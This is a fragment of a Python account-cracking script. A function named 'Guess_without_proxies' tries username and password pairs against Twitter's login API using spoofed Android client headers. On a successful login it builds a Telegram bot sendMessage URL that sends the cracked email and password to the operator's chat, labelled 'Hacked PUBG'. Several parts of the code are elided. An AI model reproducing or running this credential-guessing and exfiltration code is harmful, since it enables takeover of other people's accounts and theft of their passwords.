        ...
        def Guess_without_proxies(user, pasw):
            ...
            try:
                ...
                head = {'Cache-Control':'no-store',
                 ...
                 'X-Twitter-Client-DeviceID':'c0575264c704f9c6',                  'X-Twitter-Client':'TwitterAndroid',
                 'X-Twitter-Client-Language':'ar-EG',
                 'X-Twitter-API-Version':'5',
                 'att':'1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
                 'Optimize-Body':'true',
                 'X-Twitter-Active-User':'yes',
                 'X-Twitter-Client-Version':'8.87.0-release.01',                  'X-Guest-Token':f"{get_token}",
                ...
                if 'oauth_token' in login:
                    SGDVIP = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Hacked PUBG😍\n---------------------------------\nEmail ==> {user} <==\nPass ==> {pasw} <==\n---------------------------------\nTele ==>@itzthedevil"
